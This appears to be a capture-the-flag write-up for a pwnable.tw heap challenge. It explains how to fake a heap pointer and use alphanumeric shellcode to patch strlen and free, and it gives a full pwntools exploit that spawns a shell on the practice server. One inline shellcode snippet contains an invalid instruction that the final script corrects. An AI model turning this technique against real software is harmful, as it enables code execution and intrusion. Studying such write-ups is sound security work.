The intented solution should be constructing `read` shellcode, but my solution is to bypass the check of `strlen`.

Since we can't input `ret (\xc3)`, but we can fake a fd ptr on the heap which has `\xc3` , where we can `jne` to. (1/16 chance)

```python
for i in range(0x30):
    add(0, 'a\n')
add(1, 'a\n') # write shellcode
add(0, 'a\n')
add(0, 'a\n')
add(0, 'a\n')
add(2, 'a\n')
add(3, 'a\n') # fd has \xc3
dele(2)
dele(3)
dele(1)
```

Then on the heap 1, we can write shellcode like this:
```
# Part 1
push eax (P)
pop eax (X)
push 0 (j\x00)
# Part 2
pop eax (X)
jne xx (uJ)
```
Since we can't input `\x00`, we can first write part 2, then free it, and write part1.
```python
add(1, 'aaaaXuJ\n')
dele(1)
add(-22, 'PXj\n')
```
So the `strlen` function has been changed into `return 0`.

Then we can input arbitrary characters once, I choose to rewrite `strlen` function at first.
```python
add(-22, asm("xor eax, eax;ret") + '\n')
```

Then we can input arbitrarily, we can rewrite `free` function to get shell:
```python
sh = """
    push eax
    pop ebx
    push 11
    pop 0xb
    int 0x80
"""
add(-27, asm(sh))
add(2, "/bin/sh\x00")
dele(2)
```

Exp:
```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

#context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./pwn")
elf = ELF(pwn_file)
libc = ELF("./bc.so.6")

def debug():
    gdb.attach(r, "b *0x080487AE\nb *0x8048828")

def add(idx, name):
    r.sendlineafter(" :", '1')
    r.sendlineafter(" :", str(idx))
    r.sendafter(" :", name)

def show(idx):
    r.sendlineafter(" :", '2')
    r.sendlineafter(" :", str(idx))

def dele(idx):
    r.sendlineafter(" :", '3')
    r.sendlineafter(" :", str(idx))

while True:
    try:
        #r = process(pwn_file)
        r = remote("chall.pwnable.tw", 10300)
        for i in range(0x30):
            add(0, 'a\n')
        add(1, 'a\n')
        add(0, 'a\n')
        add(0, 'a\n')
        add(0, 'a\n')
        add(2, 'a\n')
        add(3, 'a\n')
        dele(2)
        dele(3)
        dele(1)
        add(1, 'aaaaXuJ\n')
        dele(1)
        add(-22, 'PXj\n')

        print "start!!!"
        add(-22, asm("xor eax, eax;ret") + '\n')
        print r.recvline()
    except:
        print "error"
        r.close()
        continue
    else:
        break

context.log_level = "debug"

sh = """
    push eax
    pop ebx
    push 0xb
    pop eax
    int 0x80
"""
add(-27, asm(sh))
add(2, "/bin/sh\x00")
dele(2)

r.interactive()
```
